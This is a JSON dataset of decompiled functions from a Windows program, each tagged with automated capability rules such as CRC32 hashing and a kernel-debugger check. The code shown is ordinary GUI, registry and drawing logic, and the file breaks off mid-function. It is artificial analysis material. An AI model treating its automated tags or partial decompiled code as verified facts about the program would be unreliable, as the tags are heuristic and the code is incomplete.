{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl method.ATL::CComModule.virtual_0(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.ATL::CComModule.0;\n    fcn.0040d990();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042fafa(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00401ee0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00401ee0(uint32_t arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    \n    if ((arg_8h & 2) != 0) {\n        arg_8h_00 = in_ECX + -1;\n        iVar3 = *arg_8h_00;\n        piVar2 = in_ECX + iVar3 * 3;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            piVar1 = piVar2 + -3;\n            piVar2 = piVar2 + -3;\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*piVar1);\n        }\n        if ((arg_8h & 1) != 0) {\n            fcn.0042fb16(arg_8h_00);\n        }\n        return arg_8h_00;\n    }\n    (*_sym.imp.OLEAUT32.dll_SysStringLen)(*in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042fafa(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 292
    },
    "00401f60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f60(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x24) != 0) {\n        (*_sym.imp.UxTheme.dll_EndBufferedPaint)(*(in_ECX + 0x24), 1);\n        *(in_ECX + 0x24) = 0;\n    }\n    cVar1 = fcn.00406560();\n    if (cVar1 != '\\0') {\n        (*_sym.imp.UxTheme.dll_BufferedPaintUnInit)();\n    }\n    if (*(in_ECX + 0x14) != 0) {\n        fcn.0042f7fa(*(in_ECX + 0x14));\n    }\n    if ((arg_8h & 1) != 0) {\n        fcn.0042fafa(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00402020": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402020(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00401bf0();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042fafa(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00402620": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Removing unreachable block (ram,0x0040284a)\n// WARNING: Type propagation algorithm not settling\n\nvoid __cdecl fcn.00402620(int32_t *arg_8h, uchar *arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    char *pcVar9;\n    uint *puVar10;\n    char **extraout_ECX;\n    char cVar11;\n    uint8_t uVar12;\n    uint unaff_EBX;\n    uint32_t uVar13;\n    int32_t *piVar14;\n    uint32_t uVar16;\n    uint8_t *puVar17;\n    uint *puVar18;\n    uint8_t in_AF;\n    unkbyte6 Var19;\n    uint *puStackY8460;\n    uint auStackY8456 [64];\n    int16_t iStackY8200;\n    uchar auStackY8198 [8142];\n    uint uStackY56;\n    int32_t iStackY52;\n    uchar *puStackY48;\n    uchar *puStackY44;\n    uchar *puStackY40;\n    uint *puStackY36;\n    uchar *arg_8h_00;\n    uchar *arg_8h_01;\n    uint var_4h;\n    uint8_t uVar15;\n    \n    fcn.00430400();\n    arg_8h_01 = &stack0xffffdff8;\n    iVar5 = fcn.00406910(arg_8h_01);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n    if (iVar5 < 0) {\ncode_r0x00402a65:\n        fcn.004303e9(unaff_EBX);\n        return;\n    }\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n    if (iVar5 == 0) {\n        uVar13 = 8;\n    }\n    else {\n        iVar5 = (*pcVar2)();\n        if (iVar5 == 0) {\n            uVar13 = 0x4008;\n        }\n        else {\n            iVar5 = (*pcVar2)();\n            if (iVar5 == 0) {\n                uVar13 = 0x13;\n            }\n            else {\n                iVar5 = (*pcVar2)();\n                if (iVar5 != 0) goto code_r0x00402a65;\n                uVar13 = 0x11;\n            }\n        }\n    }\n    fcn.0040d690();\n    arg_8h_00 = &stack0xffffdff8;\n    iVar5 = fcn.00406910(arg_8h_00);\n    pcVar2 = _sym.imp.USER32.dll_CharNextW;\n    if (iVar5 < 0) goto code_r0x00402a65;\n    if (uVar13 < 0x14) {\n        if (uVar13 == 0x13) {\n            puStackY36 = NULL;\n            puStackY40 = &stack0xffffdff8;\n            puStackY44 = 0x4028ad;\n            iVar5 = (*_sym.imp.OLEAUT32.dll_VarUI4FromDisp)();\n            if (iVar5 < 0) goto code_r0x00402a65;\n            puStackY36 = NULL;\n            puStackY40 = arg_ch;\n            puStackY44 = *arg_8h;\n            puStackY48 = 0x4028d7;\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)();\n        }\n        else if (uVar13 == 8) {\n            piVar8 = &stack0xffffdff8;\n            do {\n                iVar1 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar1 != 0);\n            puStackY36 = 0x1;\n            puStackY40 = NULL;\n            puStackY44 = arg_ch;\n            puStackY48 = *arg_8h;\n            iStackY52 = 0x40288e;\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)();\n        }\n        else {\n            if (uVar13 != 0x11) goto code_r0x00402a32;\n            piVar8 = &stack0xffffdff8;\n            do {\n                iVar1 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar1 != 0);\n            uVar13 = piVar8 - &stack0xffffdffa >> 1;\n            if ((uVar13 & 1) != 0) {\ncode_r0x00402786:\n                fcn.004303e9(arg_8h_01);\n                return;\n            }\n            uVar16 = uVar13 - (piVar8 - &stack0xffffdffa >> 0x1f) >> 1;\n            if (0x100 < uVar16) {\n                fcn.00402b20(uVar16);\n                fcn.00405c90();\n                goto code_r0x00402786;\n            }\n            puStackY36 = NULL;\n            puStackY44 = 0x4027b3;\n            puStackY40 = &stack0xffffdef8;\n            fcn.00431db0();\n            uVar16 = 0;\n            if (0 < uVar13) {\n                do {\n                    puVar17 = &stack0xffffdef8 + (uVar16 >> 1);\n                    cVar11 = *(&stack0xffffdff8 + uVar16 * 2);\n    // switch table (55 cases) at 0x402a84\n                    switch(*(&stack0xffffdff8 + uVar16 * 2)) {\n                    case 0x30:\n                    case 0x31:\n                    case 0x32:\n                    case 0x33:\n                    case 0x34:\n                    case 0x35:\n                    case 0x36:\n                    case 0x37:\n                    case 0x38:\n                    case 0x39:\n                        cVar11 = cVar11 + -0x30;\n                        break;\n                    default:\n                        cVar11 = '\\0';\n                        break;\n                    case 0x41:\n                    case 0x42:\n                    case 0x43:\n                    case 0x44:\n                    case 0x45:\n                    case 0x46:\n                        cVar11 = cVar11 + -0x37;\n                        break;\n                    case 0x61:\n                    case 0x62:\n                    case 99:\n                    case 100:\n                    case 0x65:\n                    case 0x66:\n                        cVar11 = cVar11 + -0x57;\n                    }\n                    uVar6 = uVar16 & 1;\n                    uVar16 = uVar16 + 1;\n                    *puVar17 = *puVar17 | cVar11 << (4U - (uVar6 << 2) & 0x1f);\n                } while (uVar16 < uVar13);\n            }\n            puStackY40 = 0x3;\n            puStackY44 = NULL;\n            puStackY48 = arg_ch;\n            iStackY52 = *arg_8h;\n            uStackY56 = 0x402836;\n            puStackY36 = &stack0xffffdef8;\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)();\n        }\n    }\n    else {\n        if (uVar13 != 0x4008) goto code_r0x00402a32;\n        piVar8 = &stack0xffffdff8;\n        do {\n            iVar1 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar1 != 0);\n        puStackY8460 = NULL;\n        iVar3 = ((piVar8 - &stack0xffffdffa >> 1) + 2) * 2;\n        uVar13 = iVar3;\n        if (iVar3 >> 0x20 != 0) {\n            uVar12 = 0;\n            fcn.00402f30(0x80070216);\n            Var19 = func_0xed406ab0();\n            in_AF = 9 < (Var19 & 0xf) | in_AF;\n            uVar4 = Var19 + in_AF * '\\x06';\n            uVar13 = (Var19 & 0xffffff00 | uVar4 + (0x90 < (uVar4 & 0xf0) | uVar12 | in_AF * (0xf9 < uVar4)) * '`') + 1;\n            uVar12 = Var19 >> 0x28;\n            uVar4 = uVar13;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            uVar4 = uVar4 + in_AF * '\\x06';\n            uVar13 = (uVar13 & 0xffffff00 |\n                     uVar4 + (0x90 < (uVar4 & 0xf0) | CARRY1(Var19 >> 0x20, uVar12) | in_AF * (0xf9 < uVar4)) * '`') + 1\n            ;\n            uVar15 = arg_8h >> 8;\n            piVar14 = arg_8h & 0xffff0000 | CONCAT11(uVar15 + uVar12, arg_8h);\n            uVar4 = uVar13;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            uVar4 = uVar4 + in_AF * '\\x06';\n            pcVar9 = (uVar13 & 0xffffff00 |\n                     uVar4 + (0x90 < (uVar4 & 0xf0) | CARRY1(uVar15, uVar12) | in_AF * (0xf9 < uVar4)) * '`') + 1;\n            cVar11 = pcVar9;\n            *pcVar9 = *pcVar9 + cVar11;\n            *pcVar9 = *pcVar9 + cVar11;\n            *pcVar9 = *pcVar9 + cVar11;\n            *pcVar9 = *pcVar9 + cVar11;\n            *pcVar9 = *pcVar9 + cVar11;\n            *piVar14 = *piVar14 + cVar11;\n            pcVar9 = pcVar9 + *piVar14 + *piVar14 + *piVar14;\n            *extraout_ECX = *extraout_ECX + pcVar9;\n            *extraout_ECX = *extraout_ECX + pcVar9;\n            *extraout_ECX = *extraout_ECX + pcVar9;\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if (uVar13 < 0x101) {\n            puStackY8460 = &stack0xffffdef8;\n            piVar8 = &stack0xffffdff8;\n            puVar18 = puStackY8460;\n            while (iStackY8200 != 0) {\n                puStackY36 = 0x402973;\n                piVar7 = (*pcVar2)();\n                if ((*piVar8 == 0x5c) && (*piVar7 == 0x30)) {\n                    *puVar18 = 0;\n                    puStackY36 = 0x402989;\n                    piVar8 = (*pcVar2)();\n                }\n                else {\n                    *puVar18 = *piVar8;\n                    piVar8 = piVar8 + 1;\n                }\n                puVar18 = puVar18 + 2;\n                iStackY8200 = *piVar8;\n            }\n            *puVar18 = 0;\n            puVar18 = puStackY8460;\n            if (puStackY8460 == NULL) {\n                iVar5 = 0xd;\n            }\n            else {\n                do {\n                    puVar10 = puVar18;\n                    do {\n                        iVar1 = *puVar10;\n                        puVar10 = puVar10 + 2;\n                    } while (iVar1 != 0);\n                    iVar5 = (puVar10 - (puVar18 + 2) >> 1) + 1;\n                    puVar18 = puVar18 + iVar5 * 2;\n                } while (iVar5 != 1);\n                puStackY40 = 0x7;\n                puStackY44 = NULL;\n                puStackY48 = arg_ch;\n                iStackY52 = *arg_8h;\n                uStackY56 = 0x4029f5;\n                puStackY36 = puStackY8460;\n                iVar5 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)();\n            }\n        }\n        else {\n            fcn.00402b80(uVar13);\n            iVar5 = 0xe;\n        }\n        if (puStackY8460 != &stack0xffffdef8) {\n            fcn.00405cb0();\n        }\n    }\n    if (iVar5 != 0) {\n        puStackY36 = 0x402a1c;\n        fcn.00402f10(iVar5);\n        fcn.004303e9(arg_8h_01);\n        return;\n    }\ncode_r0x00402a32:\n    puStackY36 = 0x402a43;\n    fcn.00406910(arg_10h);\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 3021
    },
    "00402f70": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_134h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402f70(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_124h;\n    uint *var_11ch;\n    uint var_118h;\n    uint lpmii;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_100h;\n    uint var_f8h;\n    uint *var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    int32_t var_e4h;\n    uint var_e0h;\n    int32_t var_dch;\n    char var_d8h;\n    uchar var_d7h;\n    uint var_d6h;\n    uint var_d0h;\n    uint lpString;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if ((arg_8h != 0) && (iVar2 = (*_sym.imp.USER32.dll_IsMenu)(arg_8h),  iVar2 == 0)) {\n        fcn.004303e9(var_134h);\n        return;\n    }\n    if (((*(in_ECX + 0x86) & 1) != 0) && (*(in_ECX + 0x44) != 0)) {\n        fcn.0040f040();\n    }\n    if ((*(in_ECX + 0x44) != 0) && ((*(in_ECX + 0x58) & 2) == 0)) {\n        (*_sym.imp.USER32.dll_DestroyMenu)(*(in_ECX + 0x44));\n    }\n    *(in_ECX + 0x44) = arg_8h;\n    pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n    if ((*(in_ECX + 0x84) & 2) == 0) {\n        (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0xb, 0, 0);\n        iVar2 = (*pcVar1)(*(in_ECX + 4), 0x418, 0, 0);\n        if (0 < iVar2) {\n            do {\n                (*pcVar1)(*(in_ECX + 4), 0x416, 0, 0);\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_ECX + 0x44) != 0) {\n            var_e4h = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(in_ECX + 0x44));\n            fcn.00431db0(&lpString, 0, 200);\n            iVar2 = 0;\n            if (0 < var_e4h) {\n                do {\n                    var_f0h = &lpString;\n                    var_e8h = 0;\n                    _var_108h = 0;\n                    _var_100h = 0;\n                    _var_f8h = 0;\n                    lpmii = 0x30;\n                    var_110h = 0x15;\n                    var_10ch = 0;\n                    var_ech = 100;\n                    (*_sym.imp.USER32.dll_GetMenuItemInfoW)(*(in_ECX + 0x44), iVar2, 1, &lpmii);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpString);\n                    if (99 < iVar3) {\n                        var_10ch = 4;\n                        (*_sym.imp.USER32.dll_SetMenuItemInfoW)(*(in_ECX + 0x44), iVar2, 1, &lpmii);\n                        lpString._0_2_ = 0;\n                    }\n                    var_d6h._0_2_ = 0;\n                    var_e0h = 0;\n                    var_d7h = 0x18;\n                    stack0xffffff28 = 0;\n                    var_d0h = 0;\n                    var_d8h = (-((_var_108h & 3) != 0) & 0xfcU) + 4;\n                    var_dch = iVar2;\n                    (*pcVar1)(*(in_ECX + 4), 0x443, 0xffffffff, &var_e0h);\n                    var_11ch = &lpString;\n                    var_118h = 0;\n                    _var_12ch = 0;\n                    _var_124h = 0;\n                    var_134h = 0x20;\n                    var_130h = 2;\n                    (*pcVar1)(*(in_ECX + 4), 0x440, iVar2, &var_134h);\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_e4h);\n            }\n        }\n        (*pcVar1)(*(in_ECX + 4), 0xb, 1, 0);\n        (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 4), 0, 1);\n        (*_sym.imp.USER32.dll_UpdateWindow)(*(in_ECX + 4));\n    }\n    fcn.004303e9(var_134h);\n    return;\n}\n",
        "token_count": 1213
    },
    "00403dd0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Switch with 1 destination removed at 0x00403e7a\n\nint32_t __cdecl fcn.00403dd0(int32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = arg_8h;\n    var_24h = arg_8h[1];\n    iVar5 = arg_8h[6];\n    piVar1 = arg_8h + 1;\n    var_20h = arg_ch;\n    arg_8h[6] = &fcn.00403dd0::var_24h;\n    ppcVar2 = *arg_8h;\n    var_18h = arg_14h;\n    var_8h = 0x24;\n    var_4h = 1;\n    var_1ch = arg_10h;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    arg_8h = NULL;\n    iVar4 = (**ppcVar2)(*piVar1, arg_ch, arg_10h, arg_14h, &fcn.00403dd0::arg_8h, 0);\n    piVar3[6] = iVar5;\n    iVar5 = iVar4;\n    if (iVar4 == 0) {\n        if (arg_ch == 0x82) {\n            piVar3[7] = piVar3[7] | 1;\n        }\n    }\n    else {\n        iVar5 = arg_8h;\n        if (arg_ch < 0x133) {\n            if (arg_ch == 0x132) goto code_r0x00403ea9;\n            if (arg_ch - 0x2e < 0xe3) {\n    // switch table (227 cases) at 0x403edc\n                switch(*(*(arg_ch + 0x403eb6) * 4 + 0x403edc)) {\n                case 0x403ea9:\n                    goto code_r0x00403ea9;\n                }\n            }\n        }\n        else if (arg_ch - 0x133 < 6) goto code_r0x00403ea9;\n        iVar5 = iVar4;\n        if ((*(piVar3 + 7) & 1) == 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongW)(piVar3[1], 0, arg_8h);\n        }\n    }\ncode_r0x00403ea9:\n    if (((piVar3[7] & 1U) != 0) && (piVar3[6] == 0)) {\n        iVar4 = piVar3[1];\n        piVar3[7] = piVar3[7] & 0xfffffffe;\n        piVar3[1] = 0;\n        (**(*piVar3 + 0xc))(iVar4);\n    }\n    return iVar5;\n}\n",
        "token_count": 753
    },
    "00404ec0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00404ec0(uint *arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    uint uVar14;\n    uint var_6ch;\n    uint hgdiobj;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    int32_t var_4ch;\n    int32_t nYDest;\n    int32_t var_44h;\n    int32_t nHeight;\n    int32_t crColor;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint *hdc;\n    uint lpvObject;\n    int32_t var_28h;\n    int32_t ARG_1;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t nXDest;\n    int32_t nYOrg;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_50h = arg_ch;\n    hdc = arg_8h;\n    var_54h = arg_1ch;\n    if (arg_1ch == 0) {\n        iVar12 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x47);\n        var_44h = iVar12;\n        ARG_1 = (*pcVar1)(0x48);\n        nHeight = ARG_1;\n        iVar12 = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(*arg_8h, iVar12, ARG_1);\n        var_54h = iVar12;\n    }\n    else {\n        _var_1ch = 0;\n        _lpvObject = ZEXT816(0);\n        iVar2 = (*_sym.imp.GDI32.dll_GetObjectW)(arg_1ch, 0x18, &lpvObject);\n        iVar12 = arg_1ch;\n        if (iVar2 == 0) {\n            var_58h = 0;\n            nHeight = 0;\n            var_44h = 0;\n            ARG_1 = var_58h;\n        }\n        else {\n            var_44h = var_28h;\n            nHeight = ARG_1;\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    crColor = *var_50h;\n    nXDest = *var_50h;\n    nYOrg = var_50h[1];\n    var_ch = var_50h[2];\n    var_8h = var_50h[3];\n    if (var_44h < var_50h[2] - *var_50h) {\n        nXDest = ((var_50h[2] - *var_50h) - var_44h) / 2 + crColor;\n        var_ch = nXDest + var_44h;\n    }\n    iVar2 = var_50h[3] - var_50h[1];\n    if (ARG_1 < iVar2) {\n        nYOrg = (iVar2 - ARG_1) / 2 + var_50h[1];\n        var_8h = nYOrg + ARG_1;\n    }\n    if ((*(var_4ch + 0x85) & 1) == 0) {\n        if ((arg_10h == 0) || (arg_14h != 0)) {\n            uVar4 = (*_sym.imp.USER32.dll_GetSysColor)(0xf);\n            crColor = (*_sym.imp.GDI32.dll_SetTextColor)(*arg_8h, uVar4);\n            uVar4 = (*pcVar1)(0x14);\n            uVar4 = (*_sym.imp.GDI32.dll_SetBkColor)(*arg_8h, uVar4);\n            piVar3 = fcn.00405d80(&var_58h);\n            iVar2 = *piVar3;\n            (*_sym.imp.GDI32.dll_SetBrushOrgEx)(*hdc, nXDest, nYOrg, 0);\n            (*_sym.imp.USER32.dll_FillRect)(*hdc, &nXDest, iVar2);\n            (*_sym.imp.GDI32.dll_SetTextColor)(*hdc, crColor);\n            arg_8h = hdc;\n            (*_sym.imp.GDI32.dll_SetBkColor)(*hdc, uVar4);\n            if (iVar2 != 0) {\n                (*_sym.imp.GDI32.dll_DeleteObject)(iVar2);\n            }\n        }\n        else {\n            (*_sym.imp.USER32.dll_FillRect)(*arg_8h, &nXDest, 5);\n        }\n    }\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    iVar2 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(*arg_8h);\n    uVar4 = (*_sym.imp.GDI32.dll_SelectObject)(iVar2, iVar12);\n    puVar13 = hdc;\n    uVar5 = (*_sym.imp.GDI32.dll_SetTextColor)(*hdc, 0);\n    uVar6 = (*_sym.imp.GDI32.dll_SetBkColor)(*puVar13, 0xffffff);\n    iVar7 = (*pcVar1)(*puVar13);\n    iVar12 = var_44h;\n    iVar8 = (*_sym.imp.GDI32.dll_CreateBitmap)(var_44h, nHeight, 1, 1, 0);\n    uVar9 = (*_sym.imp.GDI32.dll_SelectObject)(iVar7, iVar8);\n    var_38h = var_ch - nXDest;\n    var_34h = var_8h - nYOrg;\n    if (arg_1ch == 0) {\n        _lpvObject = _lpvObject & 0xffffffffffffffff;\n        iVar11 = var_50h[2] - *var_50h;\n        if (iVar12 < var_50h[2] - *var_50h) {\n            iVar11 = iVar12;\n        }\n        iVar10 = var_50h[3] - var_50h[1];\n        if (nHeight < var_50h[3] - var_50h[1]) {\n            iVar10 = nHeight;\n        }\n        _var_1ch = CONCAT44(iVar10, iVar11);\n        (*_sym.imp.USER32.dll_DrawFrameControl)(iVar7, &ARG_1, 2, (arg_18h != 0) + '\\x01');\n        if (((*(var_4ch + 0x85) & 1) == 0) && (arg_14h != 0)) {\n            crColor = nXDest + 1;\n            nYDest = nYOrg + 1;\n            (*_sym.imp.USER32.dll_FillRect)(iVar2, &ARG_1, 0x15);\n            iVar11 = (*_sym.imp.USER32.dll_GetSysColor)(0x14);\n            puVar13 = hdc;\n            if (iVar11 == 0xffffff) {\n                (*_sym.imp.GDI32.dll_BitBlt)(*hdc, crColor, nYDest, var_38h, var_34h, iVar7, 0, 0, 0xbb0226);\n                uVar14 = 0x8800c6;\n            }\n            else {\n                if (iVar11 != 0) {\n                    (*_sym.imp.GDI32.dll_BitBlt)(iVar2, 0, 0, iVar12, nHeight, iVar7, 0, 0, 0x220326);\n                }\n                puVar13 = hdc;\n                (*_sym.imp.GDI32.dll_BitBlt)(*hdc, crColor, nYDest, var_38h, var_34h, iVar7, 0, 0, 0x8800c6);\n                uVar14 = 0xee0086;\n            }\n            (*_sym.imp.GDI32.dll_BitBlt)(*puVar13, crColor, nYDest, var_38h, var_34h, iVar2, 0, 0, uVar14);\n        }\n        iVar12 = 7;\n        if (arg_14h != 0) {\n            iVar12 = 0x10;\n        }\n        (*_sym.imp.USER32.dll_FillRect)(iVar2, &ARG_1, iVar12 + 1);\n        iVar12 = (*_sym.imp.USER32.dll_GetSysColor)(iVar12);\n        puVar13 = hdc;\n        if (iVar12 == 0xffffff) {\n            (*_sym.imp.GDI32.dll_BitBlt)(*hdc, nXDest, nYOrg, var_38h, var_34h, iVar7, 0, 0, 0xbb0226);\n            uVar14 = 0x8800c6;\n        }\n        else {\n            if (iVar12 != 0) {\n                (*_sym.imp.GDI32.dll_BitBlt)(iVar2, 0, 0, var_44h, nHeight, iVar7, 0, 0, 0x220326);\n            }\n            puVar13 = hdc;\n            (*_sym.imp.GDI32.dll_BitBlt)(*hdc, nXDest, nYOrg, var_38h, var_34h, iVar7, 0, 0, 0x8800c6);\n            uVar14 = 0xee0086;\n        }\n        (*_sym.imp.GDI32.dll_BitBlt)(*puVar13, nXDest, nYOrg, var_38h, var_34h, iVar2, 0, 0, uVar14);\n    }\n    else {\n        (*_sym.imp.GDI32.dll_SetBkColor)(iVar2, *(var_4ch + 0xa0));\n        (*_sym.imp.GDI32.dll_SetBkColor)(iVar7, 0);\n        (*_sym.imp.GDI32.dll_SetTextColor)(iVar7, 0xffffff);\n        pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n        (*_sym.imp.GDI32.dll_BitBlt)(iVar7, 0, 0, iVar12, nHeight, iVar2, 0, 0, 0xcc0020);\n        (*pcVar1)(*hdc, nXDest, nYOrg, var_38h, var_34h, iVar2, 0, 0, 0x660046);\n        (*pcVar1)(*hdc, nXDest, nYOrg, var_38h, var_34h, iVar7, 0, 0, 0x8800c6);\n        (*pcVar1)(*hdc, nXDest, nYOrg, var_38h, var_34h, iVar2, 0, 0, 0x660046);\n        puVar13 = hdc;\n    }\n    (*_sym.imp.GDI32.dll_SetTextColor)(*puVar13, uVar5);\n    (*_sym.imp.GDI32.dll_SetBkColor)(*puVar13, uVar6);\n    (*_sym.imp.GDI32.dll_SelectObject)(iVar2);\n    (*_sym.imp.GDI32.dll_SelectObject)(iVar7, uVar9);\n    if (arg_1ch == 0) {\n        (*_sym.imp.GDI32.dll_DeleteObject)(var_54h);\n    }\n    if (((*(var_4ch + 0x85) & 1) == 0) && (arg_14h == 0)) {\n        if (var_44h < var_50h[2] - *var_50h) {\n            (*_sym.imp.USER32.dll_InflateRect)(&nXDest, 1, 1);\n        }\n        (*_sym.imp.USER32.dll_DrawEdge)(*puVar13, &nXDest, 2, 0xf);\n    }\n    if (iVar8 != 0) {\n        (*_sym.imp.GDI32.dll_DeleteObject)(iVar8);\n    }\n    pcVar1 = _sym.imp.GDI32.dll_DeleteDC;\n    if (iVar7 != 0) {\n        (*_sym.imp.GDI32.dll_DeleteDC)(iVar7);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    fcn.004303e9(uVar4);\n    return;\n}\n",
        "token_count": 2895
    },
    "004053e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004053e0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint32_t arg_10h;\n    uint in_stack_ffffff04;\n    uint uVar6;\n    uint var_98h;\n    uint var_94h;\n    uint32_t var_90h;\n    uint var_88h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint var_68h;\n    int32_t y;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    int32_t crColor;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t x;\n    int32_t i;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t iStack52;\n    int32_t var_2ch;\n    int32_t iStack44;\n    int32_t lprc;\n    int32_t var_20h;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t nXOrg;\n    int32_t nYOrg;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_5ch = arg_8h;\n    var_54h = *(arg_8h + 0x2c);\n    uVar5 = *(arg_8h + 0x18);\n    var_3ch = uVar5;\n    if ((*(var_54h + 8) & 0x800) != 0) {\n        lprc = *(arg_8h + 0x1c);\n        iStack32 = *(arg_8h + 0x24);\n        iStack28 = *(arg_8h + 0x28);\n        uVar6 = 6;\n        var_20h = *(arg_8h + 0x20) + (iStack28 - *(arg_8h + 0x20)) / 2;\n        